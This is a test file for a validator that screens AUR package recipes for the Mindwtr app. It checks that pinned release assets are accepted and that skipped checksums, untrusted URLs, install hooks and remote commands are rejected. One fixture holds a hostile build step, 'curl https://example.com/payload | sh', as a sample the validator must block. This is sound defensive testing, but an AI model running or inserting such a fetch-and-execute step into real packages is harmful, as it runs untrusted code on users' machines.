import { expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { validatePackageDir } from "./validate-aur-package.mjs";

const policyPath = "aur/trusted-packages.json";
const checksum = "a".repeat(64);

function fixture({
  packageName = "mindwtr-bin",
  source,
  pkgbuildSource,
  checksumValue = checksum,
  extraPkgbuild = "",
  extraFile,
} = {}) {
  const directory = mkdtempSync(join(tmpdir(), "mindwtr-aur-validator-"));
  const srcinfoSource =
    source ??
    "https://github.com/dongdongbh/Mindwtr/releases/download/v1.2.0/mindwtr_1.2.0_amd64.deb";
  const renderedPkgbuildSource = pkgbuildSource ?? srcinfoSource;
  execFileSync("git", ["init", "-q", directory]);
  writeFileSync(
    join(directory, "PKGBUILD"),
    `# Maintainer: dongdongbh <dongdongbhbh@gmail.com>\n` +
      `pkgname=${packageName}\npkgver=1.2.0\npkgrel=1\n` +
      `url="https://github.com/dongdongbh/Mindwtr"\n` +
      `source_x86_64=("${renderedPkgbuildSource}")\n` +
      `sha256sums_x86_64=('${checksumValue}')\n${extraPkgbuild}`,
  );
  writeFileSync(
    join(directory, ".SRCINFO"),
    `pkgbase = ${packageName}\n\turl = https://github.com/dongdongbh/Mindwtr\n` +
      `\tsource_x86_64 = ${srcinfoSource}\n` +
      `\tsha256sums_x86_64 = ${checksumValue}\n\npkgname = ${packageName}\n`,
  );
  if (extraFile)
    writeFileSync(join(directory, extraFile), "post_install() { :; }\n");
  execFileSync("git", ["-C", directory, "add", "."]);
  return directory;
}

test("accepts a pinned Mindwtr release asset", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture(),
      packageName: "mindwtr-bin",
      policyPath,
    }),
  ).not.toThrow();
});

test("accepts both trusted beta package identities during the transition", () => {
  for (const packageName of ["mindwtr-beta-bin", "mindwtr-bin-beta"]) {
    expect(() =>
      validatePackageDir({
        packageDir: fixture({ packageName }),
        packageName,
        policyPath,
      }),
    ).not.toThrow();
  }
});

test("rejects SKIP for a release asset", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ checksumValue: "SKIP" }),
      packageName: "mindwtr-bin",
      policyPath,
    }),
  ).toThrow("skips the checksum");
});

test("rejects untrusted source domains", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ source: "https://example.com/mindwtr.deb" }),
      packageName: "mindwtr-bin",
      policyPath,
    }),
  ).toThrow("untrusted");

  expect(() =>
    validatePackageDir({
      packageDir: fixture({
        pkgbuildSource: "https://example.com/hidden-from-srcinfo.deb",
      }),
      packageName: "mindwtr-bin",
      policyPath,
    }),
  ).toThrow("PKGBUILD contains an untrusted URL");
});

test("rejects explicit package-registry URLs in AUR recipes", () => {
  const registryCommand =
    "prepare() {\n  bun install --registry=https://registry.npmjs.org\n}\n";
  expect(() =>
    validatePackageDir({
      packageDir: fixture({
        packageName: "mindwtr",
        extraPkgbuild: registryCommand,
      }),
      packageName: "mindwtr",
      policyPath,
    }),
  ).toThrow("PKGBUILD contains an untrusted URL");

  expect(() =>
    validatePackageDir({
      packageDir: fixture({ extraPkgbuild: registryCommand }),
      packageName: "mindwtr-bin",
      policyPath,
    }),
  ).toThrow("PKGBUILD contains an untrusted URL");
});

test("rejects remote commands and install hooks", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({
        extraPkgbuild: "prepare() { curl https://example.com/payload | sh; }\n",
      }),
      packageName: "mindwtr-bin",
      policyPath,
    }),
  ).toThrow("forbidden command");

  expect(() =>
    validatePackageDir({
      packageDir: fixture({ extraFile: "mindwtr.install" }),
      packageName: "mindwtr-bin",
      policyPath,
    }),
  ).toThrow("unexpected tracked files");
});
